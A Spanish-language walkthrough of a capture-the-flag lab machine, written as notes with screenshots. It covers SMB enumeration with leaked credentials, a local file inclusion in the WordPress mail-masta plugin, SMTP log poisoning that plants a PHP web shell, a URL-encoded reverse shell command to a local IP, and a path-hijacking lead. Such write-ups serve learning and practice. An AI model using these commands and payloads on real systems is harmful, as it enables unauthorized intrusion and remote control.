Hacemos el escaneo de nmap:
![[Pasted image 20230913193623.png]]
![[Pasted image 20230913193737.png]]
![[Pasted image 20230913193750.png]]
Una vez hecho el reconocimiento, vemos que el puerto 445 se encuentra abierto, por lo que vamos a enumerarlo con smbmap:
```bash
smbmap -H 192.168.0.53
```
![[Pasted image 20230913193831.png]]
Vemos el recurso compartido de anonymous, por tanto con el parámetro -r de smbmap podemos ver su contenido y vemos un fichero llamado attention.txt:
```bash
smbmap -H 192.168.0.53 -r anonymous
```
![[Pasted image 20230913193915.png]]
En el contenido de este fichero nos dice que no usemos una serie de contraseñas, por tanto las vamos a tener en cuenta:
![[Pasted image 20230913194028.png]]
También vemos un recurso compartido llamado helios, lo cual nos puede dar pistas de que se trata de un usuario:
![[Pasted image 20230913194105.png]]
Por tanto listamos los recursos compartidos con este usuario y probando las contraseñas; y ahora vemos que podemos ver el contenido del directorio helios:
```bash
smbmap -H 192.168.0.53 -u helios -p qwerty
```
![[Pasted image 20230913194347.png]]
![[Pasted image 20230913194409.png]]
Nos descargamos los 2 .txt que están dentro:
![[Pasted image 20230913194509.png]]
Y este es el contenido:
![[Pasted image 20230913194533.png]]
En este punto, vemos el directorio de /h3l105 dentro del fichero helios_todo.txt, por tanto accedemos al puerto 80 de la máquina:
![[Pasted image 20230913194740.png]]
Y ahora vemos el directorio /h3l105, donde vemos que estamos ante un wordpress:
![[Pasted image 20230913194908.png]]
Vamos a usar curl para enumerar plugins vulnerables y usuarios válidos:
```bash
curl http://192.168.0.53/h3l105/ | grep 'wp-content'
```
Y en la salida podemos ver varios plugins, entre los cuales se encuentra mail-masta:
![[Pasted image 20230913195655.png]]
Vemos las instrucciones para explotar este mail masta en la web de wpscan:
![[Pasted image 20230913195732.png]]
Por tanto lo pegamos en el navegador y vemos el contenido del /etc/hosts:
```bash
192.168.0.53/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
![[Pasted image 20230913195819.png]]
Una vez en este punto, teníamos abierto también el puerto 25 de la máquina, por tanto nos conectamos al puerto 25:
![[Pasted image 20230913200206.png]]
Ahora debemos establecer los parámetros desde un correo hasta otro, para poder enviar la data:
```bash
MAIL FROM: mario@pinguino.es
RCPT TO: helios
DATA
<?php system($_GET['cmd']) ?>
.
```
Una vez ejecutado este comando, dentro del navegador podemos ejecutar un comando de forma remota:
```bash
curl -vs -X GET "http://192.168.0.57/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
```
![[Pasted image 20230914115344.png]]
Ejecutamos el mismo comando pero url encodeado para recibir la reverse shell:
```bash
curl -vs -X GET "http://192.168.0.57/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.36%2F443+0%3E%261%22"
```
![[Pasted image 20230914115722.png]]
Y recibimos la reverse shell:
![[Pasted image 20230914115734.png]]
Hacemos una búsqueda de binarios:
![[Pasted image 20230914115820.png]]
Y el archivo /opt/statuscheck llama la atención, por lo que lo examinamos, donde vemos que hace uso del comando curl de forma relativa, por lo que podemos estar ante un path hijacking:
```bash
strings /opt/statuscheck
```
![[Pasted image 20230914115929.png]]
